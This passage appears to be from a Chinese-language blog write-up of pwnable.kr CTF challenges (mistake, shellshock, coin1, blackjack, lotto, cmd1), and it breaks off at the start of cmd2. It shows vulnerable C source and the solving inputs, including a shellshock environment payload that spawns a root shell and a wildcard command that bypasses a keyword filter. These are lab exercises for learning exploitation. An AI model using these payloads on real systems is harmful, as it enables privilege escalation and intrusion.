fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">    sleep (time (<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> pw_buf [PW_LEN+<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="keyword">if</span>(!(len=read (fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">        close (fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> pw_buf2 [PW_LEN+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//xor your input</span></span><br><span class="line">    xor (pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">        system (<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close (fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目提示是运算符优先级第问题，而源码第 17 行又一个很明显的错误 <code>fd=open (&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code>，这里有一个连用的运算符并且没有加括号，等号的优先级通常来说是最低的，因此这行代码等价于 <code>fd=(open (&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>，而 open 返回值肯定不会小于 0，所以 fd 这时就会被赋值为 0，程序后面的 read 用 fd 读取 password 的时候，fd 是 0 就代表从标准输入里读取，这时候 password 是什么就不重要了，因为我们可以控制 password 的值，只要连续输入两个字符串，一个是另一个的 xor 版本就可以了，exp 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">s</span>):</span><br><span class="line">    x = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        x += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xor (<span class="string">&#x27;1234567890&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先输入 1234567890，然后输入 0325476981，0325476981 是 1234567890 的 xor 结果，这样就可以拿到 flag。</p><h1 id="shellshock-1-pt"><a href="#shellshock-1-pt" class="headerlink" title="shellshock (1 pt)"></a>shellshock (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setresuid (getegid (), getegid (), getegid ());</span><br><span class="line">    setresgid (getegid (), getegid (), getegid ());</span><br><span class="line">    system (<span class="string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很简单的 shellshock 漏洞的利用，网上有很多 payload，在 bash 输入以下 payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> gu=<span class="string">&#x27;() &#123; :;&#125;;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p>然后执行 shellshock 程序，就可以拿到一个 root 的 shell，直接读 flag 即可。</p><h1 id="coin1-6-pt"><a href="#coin1-6-pt" class="headerlink" title="coin1 (6 pt)"></a>coin1 (6 pt)</h1><p>这是一个编程题，没给源码，没给程序，是一个算法题。题目会给一定数量 (N) 的金币，每个金币的重量为 10，但是其中有一个假金币，假金币的重量为 9，题目会给一定的称重次数 (C)，每次可以选择不同序号的金币称重获得总重量，在称重次数用完以后就需要给出假金币的序号，在一分钟内一共猜中 100 次假金币的序号才会给 flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">-              Shall we play a game?              -</span><br><span class="line">---------------------------------------------------</span><br><span class="line"></span><br><span class="line">You have given some gold coins in your hand</span><br><span class="line">however, there is one counterfeit coin among them</span><br><span class="line">counterfeit coin looks exactly same as real coin</span><br><span class="line">however, its weight is different from real one</span><br><span class="line">real coin weighs 10, counterfeit coin weighes 9</span><br><span class="line">help me to find the counterfeit coin with a scale</span><br><span class="line">if you find 100 counterfeit coins, you will get reward :)</span><br><span class="line">FYI, you have 60 seconds.</span><br><span class="line"></span><br><span class="line">- How to play -</span><br><span class="line">1. you get a number of coins (N) and number of chances (C)</span><br><span class="line">2. then you specify a set of index numbers of coins to be weighed</span><br><span class="line">3. you get the weight information</span><br><span class="line">4. 2~3 repeats C time, then you give the answer</span><br><span class="line"></span><br><span class="line">- Example -</span><br><span class="line">[Server] N=4 C=2     # find counterfeit among 4 coins with 2 trial</span><br><span class="line">[Client] 0 1         # weigh first and second coin</span><br><span class="line">[Server] 20            # scale result : 20</span><br><span class="line">[Client] 3            # weigh fourth coin</span><br><span class="line">[Server] 10            # scale result : 10</span><br><span class="line">[Client] 2             # counterfeit coin is third!</span><br><span class="line">[Server] Correct!</span><br><span class="line"></span><br><span class="line">- Ready? starting in 3 sec... -</span><br></pre></td></tr></table></figure><p>这种类型的题目可以用二分法来解，对二分法来说，题目给的称重次数是肯定够用的，先称左半部分，重量是否是预期的重量（即总重量 = 数量 * 10），否则假金币就在右半部分，以此类推直到最后只剩下一个金币。</p><p>最终的 exp 如下，由于远程连接比较慢，一分钟只能跑 20 多次，所以需要上传到服务器去跑，随便找个以前的题目，去 tmp 目录下跑就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">HOST = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">PORT = <span class="number">9007</span></span><br><span class="line"></span><br><span class="line">context.update (terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update (log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">conn = remote (HOST, PORT)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">start, end</span>):</span><br><span class="line">    rg = [<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end)]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> rg:</span><br><span class="line">        rg = [<span class="built_in">str</span>(start)]</span><br><span class="line">    conn.sendline (<span class="string">&#x27; &#x27;</span>.join (rg))</span><br><span class="line">    result = <span class="built_in">int</span>(conn.recvline ()[:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError ()</span><br><span class="line">    <span class="keyword">return</span> result != <span class="built_in">len</span>(rg) * <span class="number">10</span></span><br><span class="line">conn.recvuntil (<span class="string">&#x27;N=&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    conn.recvuntil (<span class="string">&#x27;N=&#x27;</span>)</span><br><span class="line">    line = conn.recvline ()</span><br><span class="line">    t = line.split ()</span><br><span class="line">    N = <span class="built_in">int</span>(t [<span class="number">0</span>])</span><br><span class="line">    C = <span class="built_in">int</span>(t [<span class="number">1</span>].split (<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    log.info (<span class="string">&#x27;N=% d C=% d&#x27;</span> % (N, C))</span><br><span class="line"></span><br><span class="line">    left, right = <span class="number">0</span>, N</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(C):</span><br><span class="line">        mid = (right + left) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># log.info (&#x27;Count: % d/% d&#x27; % (i+1, C))</span></span><br><span class="line">        <span class="comment"># log.info (&#x27;% d % d % d&#x27; % (left, mid, right))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> send (left, mid):</span><br><span class="line">                <span class="comment"># Coin in here.</span></span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="comment"># Find it.</span></span><br><span class="line">            <span class="comment"># log.info (&#x27;Find % d&#x27; % left)</span></span><br><span class="line">            l = C-i-<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> l &lt; <span class="number">0</span>:</span><br><span class="line">                log.error (<span class="string">&#x27;Not enough count!&#x27;</span>)</span><br><span class="line">                exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">                send (<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">            conn.sendline (<span class="built_in">str</span>(left))</span><br><span class="line">            ret = conn.recvline ()</span><br><span class="line">            <span class="keyword">assert</span> <span class="string">&#x27;Correct&#x27;</span> <span class="keyword">in</span> ret</span><br><span class="line">            log.success (ret)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># log.info (&#x27;Find % d&#x27; % mid)</span></span><br><span class="line">        conn.sendline (<span class="built_in">str</span>(mid))</span><br><span class="line">        ret = conn.recvline ()</span><br><span class="line">        <span class="keyword">assert</span> <span class="string">&#x27;Correct&#x27;</span> <span class="keyword">in</span> ret</span><br><span class="line">        log.success (ret)</span><br><span class="line"></span><br><span class="line">log.success (conn.recvline ())</span><br><span class="line">log.success (conn.recvline ())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="blackjack-1-pt"><a href="#blackjack-1-pt" class="headerlink" title="blackjack (1 pt)"></a>blackjack (1 pt)</h1><p>和上一题一样，没给源码没给程序，看规则应该是一个类似 21 点的游戏，游戏开始只有 500$，可以下赌注，如果点数超过 21 点就输了，目标是获得 1000,000$。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">           RULES of VLAD&#x27;s BLACKJACK</span><br><span class="line">          ---------------------------</span><br><span class="line">I.</span><br><span class="line">     Thou shalt not question the odds of this game.</span><br><span class="line">      S This program generates cards at random.</span><br><span class="line">      D If you keep losing, you are very unlucky!</span><br><span class="line"></span><br><span class="line">II.</span><br><span class="line">     Each card has a value.</span><br><span class="line">      S Number cards 1 to 10 hold a value of their number.</span><br><span class="line">      D J, Q, and K cards hold a value of 10.</span><br><span class="line">      C Ace cards hold a value of 11</span><br><span class="line">     The goal of this game is to reach a card value total of 21.</span><br><span class="line"></span><br><span class="line">III.</span><br><span class="line">     After the dealing of the first two cards, YOU must decide whether to HIT or STAY.</span><br><span class="line">      S Staying will keep you safe, hitting will add a card.</span><br><span class="line">     Because you are competing against the dealer, you must beat his hand.</span><br><span class="line">     BUT BEWARE!.</span><br><span class="line">      D If your total goes over 21, you will LOSE!.</span><br><span class="line">     But the world is not over, because you can always play again.</span><br><span class="line"></span><br><span class="line">SHC YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM CHS</span><br><span class="line"></span><br><span class="line">Would you like to go the previous screen? (I will not take NO for an answer)</span><br><span class="line">                  (Y/N)</span><br><span class="line">                    </span><br></pre></td></tr></table></figure><p>其实看了半天也没太看懂算分的规则，但是不重要。首先需要输入你的赌注，赌注可以输入负数，所以只要玩输了就会赚，不知道为什么， 有时候赌注输入的负数太大了（没有溢出）最后就说我破产了，所以一点点十几万的往上加赌注，一直输，知道赢了 100 万就拿到 flag 了。</p><h1 id="lotto-2-pt"><a href="#lotto-2-pt" class="headerlink" title="lotto (2 pt)"></a>lotto (2 pt)</h1><p>这次的题目也是个 游戏，给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> submit [<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Submit your 6 lotto bytes : &quot;</span>);</span><br><span class="line">    fflush (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    r = read (<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Lotto Start!\n&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep (1);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//generate lotto numbers</span></span><br><span class="line">    <span class="type">int</span> fd = open (<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> lotto [<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">if</span>(read (fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">        lotto [i] = (lotto [i] % <span class="number">45</span>) + <span class="number">1</span>;        <span class="comment">// 1 ~ 45</span></span><br><span class="line">    &#125;</span><br><span class="line">    close (fd);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//calculate lotto score</span></span><br><span class="line">    <span class="type">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(lotto [i] == submit [j])&#123;</span><br><span class="line">                match++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//win!</span></span><br><span class="line">    <span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">        system (<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad luck...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">help</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- nLotto Rule -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your goal is to match lotto numbers as many as you can\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;if you win lottery for *1st place*, you will get reward\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;for more details, follow the link below\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv [])</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//menu</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> menu;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;- Select Menu -\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1. Play Lotto\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2. Help\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;% d&quot;</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(menu)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                play ();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                help ();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;invalid menu\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一个被称为 lotto 的游戏，也就是猜数字，说白了就是刮彩票，程序会通过 <code>/dev/urandom</code> 生成 6 个 1-45 之间的随机数，我们需要输入 6 个数字，保证我们输入的 6 个数字在生成的 6 个随机数中只出现一次，我们就赢了，所以最后的这两层循环就变得容易了起来，我们可以只输入 6 个相同的数字，只要这个数字命中了随机数中的任意一个，最后 match 的结果有很大的可能性是 6，例如一直输入六个字符 <code>-</code>，也就是数字 45，只尝试了 4 次就成功了。</p><h1 id="cmd1-1-pt"><a href="#cmd1-1-pt" class="headerlink" title="cmd1 (1 pt)"></a>cmd1 (1 pt)</h1><p>非常简单的一道题，直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">filter</span><span class="params">(<span class="type">char</span>* cmd)</span>&#123;</span><br><span class="line">    <span class="type">int</span> r=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;sh&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;tmp&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv [], <span class="type">char</span>** envp)</span>&#123;</span><br><span class="line">    putenv (<span class="string">&quot;PATH=/thankyouverymuch&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(filter (argv [<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    system (argv [<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接给了一个 shell，但是去除了 PATH 环境变量，并且输入的 command 中不能出现 flag，sh，tmp 这些字符串。去除了环境变量我们就可以用 cat 的绝对路径，不能出现 flag 可以用通配符代替，最后的 payload 如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cmd1 <span class="string">&quot;/bin/cat ./fl*&quot;</span></span><br></pre></td></tr></table></figure><h1 id="cmd2-9-pt"><a href="#cmd2-9-pt" class="headerlink" title="cmd2 (9 pt)"></a>cmd2 (9 pt)</h1><p>和上一题类似，直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">filter</span><span class="params">(<span class="type">char</span>* cmd)</span>&#123;</span><br><span class="line">    <span class="type">int</span> r=<span class="number">0</span>;</span><br><span class="line">    r += <span 